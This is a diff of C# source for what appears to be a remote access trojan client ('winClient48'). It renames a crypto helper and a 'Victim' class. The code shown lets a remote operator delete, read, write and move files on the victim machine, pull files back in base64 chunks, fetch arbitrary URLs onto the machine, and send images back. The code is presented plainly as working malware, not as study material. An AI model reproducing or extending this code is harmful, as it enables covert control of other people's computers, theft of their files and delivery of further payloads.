@@ -157,33 +157,33 @@ namespace winClient48
 
             foreach (string folder in d1)
             {
-                try { Directory.Delete(folder, true); l_folder.Add($"1;{Crypto.b64E2Str(folder)};"); }
-                catch (Exception ex) { l_folder.Add($"0;{Crypto.b64E2Str(folder)};{Crypto.b64E2Str(ex.Message)}"); }
+                try { Directory.Delete(folder, true); l_folder.Add($"1;{clsCrypto.b64E2Str(folder)};"); }
+                catch (Exception ex) { l_folder.Add($"0;{clsCrypto.b64E2Str(folder)};{clsCrypto.b64E2Str(ex.Message)}"); }
             }
             foreach (string file in d2)
             {
-                try { File.Delete(file); l_file.Add($"1;{Crypto.b64E2Str(file)};"); }
-                catch (Exception ex) { l_file.Add($"0;{Crypto.b64E2Str(file)};{Crypto.b64E2Str(ex.Message)}"); }
+                try { File.Delete(file); l_file.Add($"1;{clsCrypto.b64E2Str(file)};"); }
+                catch (Exception ex) { l_file.Add($"0;{clsCrypto.b64E2Str(file)};{clsCrypto.b64E2Str(ex.Message)}"); }
             }
 
             return $"{string.Join(",", l_folder)}|{string.Join(",", l_file.ToArray())}";
         }
         public string ReadFile(string dst)
         {
-            string path = Crypto.b64D2Str(dst);
+            string path = clsCrypto.b64D2Str(dst);
             try 
             { 
-                return $"1|{dst}|{Crypto.b64E2Str(File.ReadAllText(path))}"; 
+                return $"1|{dst}|{clsCrypto.b64E2Str(File.ReadAllText(path))}"; 
             }
             catch (Exception ex) 
             {
-                return $"0|{dst}|{Crypto.b64E2Str(ex.Message)}"; 
+                return $"0|{dst}|{clsCrypto.b64E2Str(ex.Message)}"; 
             }
         }
         public string WriteFile(string file, string text)
         {
-            try { File.WriteAllText(file, text); return "1|" + Crypto.b64E2Str(file) + "|"; }
-            catch (Exception ex) { return $"0|{Crypto.b64E2Str(file)}|{Crypto.b64E2Str(ex.Message)}"; }
+            try { File.WriteAllText(file, text); return "1|" + clsCrypto.b64E2Str(file) + "|"; }
+            catch (Exception ex) { return $"0|{clsCrypto.b64E2Str(file)}|{clsCrypto.b64E2Str(ex.Message)}"; }
         }
         public string PasteItems(string[] folders, string[] files, string dir_dst, bool mv = false)
         {
@@ -196,11 +196,11 @@ namespace winClient48
                     CopyDirectory(folder, dir_dst);
                     if (mv)
                         Directory.Delete(folder, true);
-                    list.Add($"1|d|{Crypto.b64E2Str(folder)}|{Crypto.b64E2Str(folder_dst)}");
+                    list.Add($"1|d|{clsCrypto.b64E2Str(folder)}|{clsCrypto.b64E2Str(folder_dst)}");
                 }
                 catch (Exception ex)
                 {
-                    list.Add($"0|d|{Crypto.b64E2Str(folder)}|{Crypto.b64E2Str(ex.Message)}");
+                    list.Add($"0|d|{clsCrypto.b64E2Str(folder)}|{clsCrypto.b64E2Str(ex.Message)}");
                 }
             }
             foreach (string file in files)
@@ -211,15 +211,15 @@ namespace winClient48
                     File.Copy(file, file_dst);
                     if (mv)
                         File.Delete(file);
-                    list.Add($"1|f|{Crypto.b64E2Str(file)}|{Crypto.b64E2Str(file_dst)}");
+                    list.Add($"1|f|{clsCrypto.b64E2Str(file)}|{clsCrypto.b64E2Str(file_dst)}");
                 }
                 catch (Exception ex)
                 {
-                    list.Add($"0|f|{Crypto.b64E2Str(file)}|{Crypto.b64E2Str(ex.Message)}");
+                    list.Add($"0|f|{clsCrypto.b64E2Str(file)}|{clsCrypto.b64E2Str(ex.Message)}");
                 }
             }
 
-            return string.Join(",", list.Select(x => Crypto.b64E2Str(x)).ToArray());
+            return string.Join(",", list.Select(x => clsCrypto.b64E2Str(x)).ToArray());
         }
         private void CopyDirectory(string dir_src, string dir_dst)
         {
@@ -246,7 +246,7 @@ namespace winClient48
         {
 
         }
-        public void Download(string[] files, Victim v)
+        public void Download(string[] files, clsVictim v)
         {
             int chunk_size = 1024 * 5;
             byte[] file_buffer = new byte[chunk_size];
@@ -292,7 +292,7 @@ namespace winClient48
                             "file",
                             "df",
                             "recv",
-                            Crypto.b64E2Str(tgt_filename), //TARGET FILE PATH
+                            clsCrypto.b64E2Str(tgt_filename), //TARGET FILE PATH
                             file_len.ToString(), //FILE LENGTH
                             (i * chunk_size).ToString(), //OFFSET
                             b64_data, //BASE64 FILE DATA
@@ -305,7 +305,7 @@ namespace winClient48
             }
         }
 
-        public (int, string, string) Wget(Victim v, string url, string szCurrentDir)
+        public (int, string, string) Wget(clsVictim v, string url, string szCurrentDir)
         {
             int code = 1;
             string msg = string.Empty;
@@ -335,7 +335,7 @@ namespace winClient48
 
                         clnt.DownloadProgressChanged += (s, e) =>
                         {
-                            v.SendCommand($"file|wget|progress|{Crypto.b64E2Str(url)}|{Crypto.b64E2Str(szSavePath)}|{e.ProgressPercentage}|{e.BytesReceived}/{e.TotalBytesToReceive}");
+                            v.SendCommand($"file|wget|progress|{clsCrypto.b64E2Str(url)}|{clsCrypto.b64E2Str(szSavePath)}|{e.ProgressPercentage}|{e.BytesReceived}/{e.TotalBytesToReceive}");
                         };
 
                         clnt.DownloadFile(url, szSavePath);
@@ -354,14 +354,14 @@ namespace winClient48
             return (code, msg, szSaveFileName);
         }
 
-        public List<string> ShowImage(Victim v, string data)
+        public List<string> ShowImage(clsVictim v, string data)
         {
             List<string> b64_imgs = new List<string>();
             try
             {
                 foreach (string enc_file in data.Split(','))
                 {
-                    string filename = Crypto.b64D2Str(enc_file);
+                    string filename = clsCrypto.b64D2Str(enc_file);
                     Bitmap img = (Bitmap)Image.FromFile(filename);
                     string b64_data = Global.BitmapToBase64(img);
                     v.encSend(2, 0, $"file|img|{enc_file};{b64_data}");
